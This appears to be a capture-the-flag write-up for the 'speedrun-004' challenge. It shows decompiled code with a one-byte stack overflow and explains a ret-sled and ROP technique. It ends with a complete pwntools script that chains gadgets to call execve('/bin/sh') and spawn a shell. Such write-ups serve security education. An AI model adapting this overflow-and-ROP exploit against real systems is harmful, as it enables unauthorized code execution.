```
./speedrun-004: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3633fdca0065d9365b3f0c0237c7785c2c7ead8f, stripped
```

Statically linked binary!

```
void __cdecl sub_400BD2()
{
  char buf; // [rsp+2h] [rbp-Eh]
  char v1; // [rsp+Bh] [rbp-5h]
  int size; // [rsp+Ch] [rbp-4h]

  puts((__int64)"how much do you have to say?");
  read(0, &buf, 9uLL);
  v1 = 0;
  size = atoi((__int64)&buf);
  if ( size > 0 )
  {
    if ( size <= 257 )
      func(size);
    else
      puts((__int64)"That's too much to say!.");
  }
  else
  {
    puts((__int64)"That's not much to say.");
  }
} 

void __fastcall func(int size)
{
  char buf[256]; // [rsp+10h] [rbp-100h]

  buf[0] = 0;
  puts((__int64)"Ok, what do you have to say for yourself?");
  read(0, buf, size);
  printf((__int64)"Interesting thought \"%s\", I'll take it into consideration.\n", buf);
}
```

We input 257 in sub_400BD2 which leads to one-byte overflow in func().
Since sub_400BD2 returns right after func() returns, we can return to the address value somewhere in buf using one-byte overflow.
It is not easy to use specific stack address. but we can use ret sled, filling buf with address of 'ret' gadget, 
followed by rop chain that calls execve("/bin/sh", NULL, NULL)

```
from pwn import *

bin = ELF('./speedrun-004')

bss = 0x6bc0f6
pop_rax_ret = 0x415f04
pop_rdi_ret = 0x400686
pop_rsi_ret = 0x410a93
pop_rdx_ret = 0x44a155
syscall_ret = 0x474f15
mov_ret = 0x47f521  # move qword ptr [rsi], rax ; ret
ret = 0x400416

p = process('./speedrun-004')

# gdb.attach(p, 'b * 0x400c45')

p.recvuntil('how much do you have to say?\n')
p.send(str(257))

rop_chain = p64(pop_rsi_ret) + p64(bss)
rop_chain += p64(pop_rax_ret) + '/bin/sh\x00'
rop_chain += p64(mov_ret)
rop_chain += p64(pop_rax_ret) + p64(0x3b)
rop_chain += p64(pop_rdi_ret) + p64(bss)
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(syscall_ret)

payload = p64(ret) * ((0x100 - len(rop_chain)) / 8)
payload += rop_chain
payload += '\x00'

p.sendafter('Ok, what do you have to say for yourself?\n', payload)
p.interactive()
```